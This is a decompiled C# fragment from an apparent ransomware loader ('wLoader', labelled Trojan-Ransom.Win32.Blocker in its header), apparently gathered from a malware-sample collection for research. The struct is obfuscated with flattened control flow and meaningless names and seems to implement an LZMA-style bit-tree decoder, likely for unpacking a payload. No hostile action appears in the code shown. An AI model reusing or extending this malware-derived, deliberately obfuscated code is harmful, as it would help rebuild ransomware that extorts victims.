// Decompiled with JetBrains decompiler
// Type: ?13?
// Assembly: wLoader, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 89823795-D5B3-4CC9-949D-6649607AF138
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.bndr-d893b556a8d0493f8839c80049bd91fd0bdbcb93646edcc7b2f28d89325ced11.exe

using System;

internal struct \u003F13\u003F
{
  private \u003F12\u003F[] \u003F0\u003F;
  private int \u003F0\u003F;

  public \u003F13\u003F(int _param1)
  {
    this.\u003F0\u003F = _param1;
    this.\u003F0\u003F = new \u003F12\u003F[1 << _param1];
  }

  public void \u003F0\u003F()
  {
    for (uint index = 1; (long) index < (long) (1 << this.\u003F0\u003F); ++index)
      this.\u003F0\u003F[(IntPtr) index].\u003F0\u003F();
  }

  public uint \u003F0\u003F(\u003F14\u003F _param1)
  {
    uint index = 1;
    int num1 = 0;
    int num2;
    while (true)
    {
      switch (num1)
      {
        case 0:
          num2 = this.\u003F0\u003F;
          num1 = 1;
          continue;
        case 1:
          if (num2 > 0)
          {
            index = (index << 1) + this.\u003F0\u003F[(IntPtr) index].\u003F0\u003F(_param1);
            num1 = 2;
            continue;
          }
          goto label_6;
        default:
          --num2;
          goto case 1;
      }
    }
label_6:
    return index - (uint) (1 << this.\u003F0\u003F);
  }

  public uint \u003F5\u003F(\u003F14\u003F _param1)
  {
    uint index = 1;
    int num1 = 0;
    uint num2;
    int num3;
    uint num4;
    while (true)
    {
      switch (num1)
      {
        case 0:
          num2 = 0U;
          num1 = 1;
          continue;
        case 1:
          num3 = 0;
          num1 = 2;
          continue;
        case 2:
          if (num3 < this.\u003F0\u003F)
          {
            num4 = this.\u003F0\u003F[(IntPtr) index].\u003F0\u003F(_param1);
            num1 = 3;
            continue;
          }
          goto label_10;
        case 3:
          index <<= 1;
          num1 = 4;
          continue;
        case 4:
          index += num4;
          num1 = 5;
          continue;
        case 5:
          num2 |= num4 << num3;
          num1 = 6;
          continue;
        default:
          ++num3;
          goto case 2;
      }
    }
label_10:
    return num2;
  }

  public static uint \u003F0\u003F(
    \u003F12\u003F[] _param0,
    uint _param1,
    \u003F14\u003F _param2,
    int _param3)
  {
    uint num1 = 1;
    int num2 = 0;
    uint num3;
    int num4;
    uint num5;
    while (true)
    {
      switch (num2)
      {
        case 0:
          num3 = 0U;
          num2 = 1;
          continue;
        case 1:
          num4 = 0;
          num2 = 2;
          continue;
        case 2:
          if (num4 < _param3)
          {
            num5 = _param0[(IntPtr) (_param1 + num1)].\u003F0\u003F(_param2);
            num2 = 3;
            continue;
          }
          goto label_10;
        case 3:
          num1 <<= 1;
          num2 = 4;
          continue;
        case 4:
          num1 += num5;
          num2 = 5;
          continue;
        case 5:
          num3 |= num5 << num4;
          num2 = 6;
          continue;
        default:
          ++num4;
          goto case 2;
      }
    }
label_10:
    return num3;
  }
}
